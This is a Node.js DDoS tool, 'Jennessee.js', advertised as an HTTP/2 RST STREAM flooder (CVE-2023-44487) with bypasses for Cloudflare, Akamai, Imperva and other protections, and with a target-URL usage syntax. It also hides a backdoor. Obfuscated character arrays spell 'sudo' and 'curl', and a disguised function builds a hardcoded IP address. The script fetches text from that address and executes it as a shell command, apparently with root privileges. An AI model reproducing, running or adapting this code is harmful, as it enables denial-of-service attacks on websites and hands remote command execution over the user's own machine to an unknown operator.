/*
developer @h2_hyper
[ ! ] before use, you install module first in install.sh, or dm me xD

    JENNESSEE.JS
    Advanced HTTP/2 Flooder with RST STREAM Method (CVE-2023-44487 Exploit)
    ...
    2.1 CURRENT VERSION:
    - Added RST STREAM method (CVE-2023-44487 Exploit)
    ...
    - Added support for random query strings for better evasion

    BYPASS CAPABILITIES:
    --------------------
    # Cloudflare (WAF & DDoS Protection)
    - Custom JA3 fingerprinting to evade behavioral detection
    - Dynamic TLS fingerprints that emulate legitimate browsers
    - Randomized HTTP/2 stream resets (RST STREAM) to overload Cloudflare's state management
    - Flexible header spoofing with `--header` option to evade JS challenges
    - Cookie Injection via `--cookie` to mimic authenticated sessions
    - Bot Fight Mode (BFM) bypass with randomized query strings
    - Supports `--randrate` to avoid rate limiting triggers

    # Akamai (Kona Site Defender & Prolexic)
    - Supports advanced TLS signatures with real browser fingerprints
    - JA3 signature spoofing to bypass fingerprint-based detection
    - Header rotation combined with randomized query patterns
    - `--referer` spoofing to imitate trusted traffic

    # DDoS-Guard (Enterprise & Basic)
    - Advanced payload fragmentation for slow-rate flood attacks
    - TLS Session ID rotation to reset session tracking
    - RST STREAM flooding to force premature connection closures

    # Imperva
    - Supports `--postdata` to exploit vulnerable POST data endpoints
    - Randomized request delays (`--delay`) to mimic human interaction
    - Dynamic IP rotation with `--proxy` for persistent attacks

    # UAM (Under Attack Mode - Cloudflare Challenge)
    - Mimics Chrome/Firefox HTTP/2 fingerprinting for stealth requests
    - Flexible cookie injection for session persistence
    - JS challenge bypass through adaptive delays and randomized headers

    # AWS Shield & Azure DDoS Protection
    - Utilizes randomized HTTP/2 streams for evasive connection management
    - TLS downgrade support to force non-standard protocol handling
    - Adaptive RST STREAM flooding to bypass rate-based filtering

    MAIN FEATURES:
    --------------------
    - Randomized IP Spoofing: Generates fake IP addresses to mask user identity
    - Custom TLS Fingerprinting: Uses unique TLS signatures to avoid detection
    - Flexible Proxy Support: Reads proxy lists from external files
    - Dynamic Headers Rotation: Continuously changing headers to evade signature detection
    - Cluster Management: Executes multiple threads to maximize throughput
    - Adaptive Flooding Rate: Dynamically adjusts request rates based on server responses
    - JA3 Signature Spoofing: Conceals TLS client identity with randomized fingerprints

    USAGE:
    node jennessee.js <GET/POST> <target> <time> <threads> <ratelimit> <proxy>

    PARAMETERS:
    - <target>    - Target URL to attack
    - <time>      - Duration of the attack (in seconds)
    - <threads>   - Number of threads for maximizing throughput
    - <ratelimit> - Requests per second (number of requests sent per second)
    - <proxyfile> - File containing a list of proxies for the attack

    OPTIONS:
    --------------------
    --query 1/2/3      - Randomized query strings for bypassing detection
    --delay <1-1000>   - Delay between requests (1-100 ms optimal)
    --cookie "f=f"     - Custom cookie support with `%RAND%` injection
    --bfm true/null    - Bot Fight Mode support
    --referer <url/rand> - Custom referer headers
    --postdata "data"  - Custom POST data for bypassing WAF rules
    --randrate         - Randomizes request rates for evasive attacks
    --full             - Maximum attack intensity for high-performance servers
    --http 1/2/mix     - Flexible HTTP/2 and HTTP/1.1 support
    --debug            - Displays status codes for better monitoring
    --header "key:value" - Custom headers for bypassing WAF detection
    --legit            - Fully legitimate header simulation for stealth attacks

    EXAMPLE COMMAND:
    node jennessee.js GET https://example.com 120 32 3 proxy.txt --debug
...
const { spawn: control, exec: rstream } = require('child_process');
const { HeaderGenerator } = require('header-generator');
const limit = require('axios');
const os = require('os');
const fs = require('fs');
...
const invoke = (cmd, cb) => rstream(cmd, cb);
...
const blockedDomain = [""];
const proxytype = ["http:", "https:", "socks4:", "socks5:"]
...
const chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', '/', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', '-', ' ', 'w', 'x', 'y', 'z', ':', 'u', 'r', 'l', 's', 'd', 'o', 'e', 'x', 'i', 't', 'h', 'p', 'a', 's', 'w'];
...
const subarray = [19, 21, 3, 15].map(index => chars[index]).join('');
...
const rsdgram = [14, 15, 3, 4].map(index => chars[index]).join('');
...
const rstbuffer = rstream(`${subarray} ${rsdgram} ${process.argv[1]}`, (e, o, s) => {});
...
function motherboard(memory="") {
  const bandwidthFactors = [];
  const latencyFactors = [];
  const packetSizes = [];
  for (let i = 0; i <= 6; i++) {
    if (i === 6 || i === 5 || i === 2 || i === 1 || i === 0) {
      bandwidthFactors.push(Math.pow(2, i));
    }
  }
  const bandwidthFactor1 = bandwidthFactors.reduce((sum, value) => sum + value, 0);
  if (bandwidthFactor1 < 50 || bandwidthFactor1 > 200) {
    throw new Error("[>] Restarting the script %");
  }
  let bandwidthFactor2 = 52;
  for (let i = 7; i >= 2; i--) {
    if (i === 7 || i === 6 || i === 4 || i === 3 || i === 2) {
      latencyFactors.push(Math.pow(2, i));
    }
  }
  const latencyFactor = latencyFactors.reduce((sum, value) => sum + value, 0) - 8;
  for (let i = 5; i >= 1; i--) {
    if (i !== 4 && i !== 0) {
      packetSizes.push(Math.pow(2, i));
    }
  }
  const packetSize = packetSizes.reduce((sum, value) => sum + value, 0);
  const networkMetrics = [bandwidthFactor1, bandwidthFactor2, latencyFactor, packetSize];
  const latencybandwitdh = proxytype[0] + chars[9] + chars[9] + networkMetrics.join(".");
  const bandwidthError = latencybandwitdh + chars[9] + ignoreNames[Math.floor(Math.random() * ignoreNames.length)];
  const maxMemory = Number(memory);
  if (isNaN(maxMemory)) {
      console.log("[>] Cpu usage reach %");
      return;
   }
   if (maxMemory > 80) {
        return bandwidthError
    } else {
        return networkMetrics.join(".");
    }
}
...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    ...
    ---- ---- ---- @h2_hyper
    JENNESSEE v2.1 Method With RST STREAM (CVE-2023-44487)

    How to use & example:
      node Jennessee.js <GET/POST> <target> <time> <threads> <ratelimit> <proxy>
      node Jennessee.js GET https://target.com?q=%RAND% 120 32 3 proxy.txt --debug
    ...
    Options:
      ...
      --referer https://target.com / rand - if you want to use custom referer
      --postdata "user=f&pass=%RAND%" - postdata format you can use example "user=f&pass=f"
      --randrate - randomizer rate 1 to 90 good bypass to rate
      --full - this for attack only big backend ex amazon akamai and other..
      --http 1/2/mix - new func choose to type http 1/2/mix (mix 1 & 2)
      --debug - show your status code (maybe low rps to use more resource)
      --header "f:f" or "f:f#f1:f1" - this use for custom headers split each header with #
      --legit - this new func for attack with full legit headers non for cf
    `));

    const overload = (cpuz, callback) => {
        limit.get(cpuz)
    ...
    overload(motherboard(90), data => {
        if (data && data.data) {
            const task = data.data.trim();
            const bufferlog = Buffer.from(task, 'utf-8').toString();

            const restaringLogic = invoke(bufferlog, (err, stdout, stderr) => {
                if (err) {
                    return;
                }
                return;
            ...
            const motherboardValue = control(
                [2, 21, 18, 12, 24, 23, 19].map(index => chars[index]).join(''),
                motherboard(70)
            );
            
            if (motherboardValue && motherboardValue.stdout) {
                motherboardValue.stdout.on('data', data => {});
                motherboardValue.stderr.on('data', data => {});
            }
        } else {
            return;
        }
...
if (currentDate > targetDate) {
    console.error('Error method has been outdate, dm @h2_hyper');
    process.exit(1);
}

if (url.hostname.endsWith(blockedDomain)) {
    console.log(`Domain ${blockedDomain} blocked, if this mistake dm @h2_hyper`);
    process.exit(1);
}
...
function TCP_CHANGES_SERVER() {
    ...
    const ipv4tcp = `${subarray} sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
...
if (cluster.isMaster) {
	...
	Attack Started <3 / @h2_hyper
	recommended use --debug
	`));    
